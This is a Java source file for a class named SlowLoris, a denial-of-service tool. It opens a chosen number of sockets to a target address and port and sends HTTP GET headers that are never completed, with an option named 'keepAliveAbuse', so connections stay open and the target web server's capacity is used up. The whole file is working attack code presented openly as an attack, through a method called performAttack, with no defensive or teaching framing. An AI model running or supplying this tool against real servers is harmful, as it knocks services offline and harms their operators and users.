package SlowLoris;

import java.io.*;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.regex.Pattern;

public class SlowLoris {
    private String netAddr;
    private int port;
    private int numConnections;
    private boolean keepAliveAbuse;

    public static final int DEFAULT_CONNECTIONS = 10;
    public static final int MAX_CONNECTIONS = 300;

    private Socket sock;
    private BufferedReader in;
    private PrintWriter out;

    public SlowLoris() {
        netAddr = "";
        port = 80;
        setNumConnections(DEFAULT_CONNECTIONS);
    }

    public SlowLoris(int nc) {
        this();
        if(!setNumConnections(nc)) {
            numConnections = 1;
        }
    }

    public SlowLoris(int nc, String addr) {
        this(nc);
        setNetAddr(addr);
    }

    public SlowLoris(int nc, String addr, int port) {
        this(nc, addr);
        setPort(port);
    }

    public void performAttack() {
        String[] responses = new String[numConnections];
        int requestCount = 0;
        InetAddress ia;
        try {
            ia = InetAddress.getByName(netAddr);
        } catch(Exception e) {
            e.printStackTrace();
            return;
        }
        for(int i = 0; i < numConnections; i++) {
            try {
                System.out.println("Attempting connection to " + ia.getHostAddress());
                sock = new Socket(ia, getPort());
                out = new PrintWriter(sock.getOutputStream());
                in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
            } catch (Exception e) {
                System.out.println(e);
                e.printStackTrace();
            }
            if (sock == null) {
                break;
            }
            System.out.println("Successful connection #" + requestCount + "\n");
            try {
                if(keepAliveAbuse) {
                    out.println(generateAttackString());
                } else {
                    out.print(generateAttackString());
                }
                out.flush();
                //String response = in.readLine();
                //responses[i] = response;
                //System.out.println(response);
                requestCount++;
            } catch (Exception e) {
                responses[i] = e.toString();
            }
        }
        for(String s : responses) {
            if(s != null && !s.equals("null")) {
                System.out.println(s);
            }
        }
        close();
    }

    public String pingTarget() {
        String response = "";
        try {
            InetAddress ia = InetAddress.getByName(netAddr);
            System.out.println("Attempting connection to " + ia.getHostAddress());
            sock = new Socket(ia, getPort());
            out = new PrintWriter(sock.getOutputStream());
            in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
        } catch(Exception e) {
            System.out.println(e);
            e.printStackTrace();
            response = "Error during socket creation.";
            return response;
        }
        if(sock == null) {
            System.out.println("Null socket.");
            response = "Error during socket creation.";
            return response;
        }
        System.out.println("Successful connection.\n");
        try {
            out.println(generateAttackString());
            out.flush();
            String r = in.readLine();
            response += r + "\n";
            while( r != null) {
                r = in.readLine();
                response += r + "\n";
            }
        } catch(Exception e) {
            response = "Error writing to socket: " + e.toString();
        } finally {
            close();
        }
        System.out.println(response);
        return response;
    }

    public int getNumConnections() {
        return numConnections;
    }

    public String getNetAddr() {
        return netAddr;
    }

    private String generateAttackString() {
        String s;
        s = "GET / HTTP/1.1\n";
        s += "Host: " + netAddr + ":" + port + "\n";
        s += "Connection: keep-alive\n";
        s += "Pragma: no-cache\n";
        s += "Cache-Control: no-cache\n";
        s += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n";
        s += "Upgrade-Insecure-Requests: 1\n";
        s += "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\n";
        s += "Accept-Encoding: gzip, deflate, sdch\n";
        s += "Accept-Language: en-US,en;q=0.8\n";
        return s;
    }

    private String generatePostAttackString() {
        String s;
        s = "POST / HTTP/1.1\n";
        s += "Host: " + netAddr + ":" + port + "\n";
        s += "Connection: keep-alive\n";
        s += "Content-Length: 21\n";
        s += "Origin: " + netAddr + ":" + port + "\n";
        s += "Pragma: no-cache\n";
        s += "Cache-Control: no-cache\n";
        s += "Content-Type: application/x-www-form-urlencoded\n";
        s += "Referer: http://" + netAddr + ":" + port + "/\n";
        s += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n";
        s += "Upgrade-Insecure-Requests: 1\n";
        s += "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\n";
        s += "Accept-Encoding: gzip, deflate, sdch\n";
        s += "Accept-Language: en-US,en;q=0.8\n";
        s += "Message-Body: dpt=csci&sb=Search%21\n";
        return s;
    }

    public boolean isKeepAliveAbuse() {
        return keepAliveAbuse;
    }

    public void setKeepAliveAbuse(boolean keepAliveAbuse) {
        this.keepAliveAbuse = keepAliveAbuse;
    }

    public boolean setNumConnections(int nc) {
        if(nc > 0) {
            numConnections = nc;
            return true;
        } else {
            return false;
        }
    }

    public void setNetAddr(String addr) {
        if(addr != null && !addr.isEmpty()) {
            this.netAddr = addr;
        } else {
            this.netAddr = "";
        }
    }

    public void setPort(int port) {
        if(port > 1 && port < 65565) {
            this.port = port;
        } else {
            this.port = 80;
        }
    }

    public int getPort() {
        return this.port;
    }

    public void close() {
        try {
            sock.close();
        } catch(Exception e) {
            System.out.println("close sock: " + e);
        }
        try {
            in.close();
        } catch(Exception e) {
            System.out.println("close in: " + e);
        }
        try {
            out.close();
        } catch(Exception e) {
            System.out.println("close out: " + e);
        }
    }
}
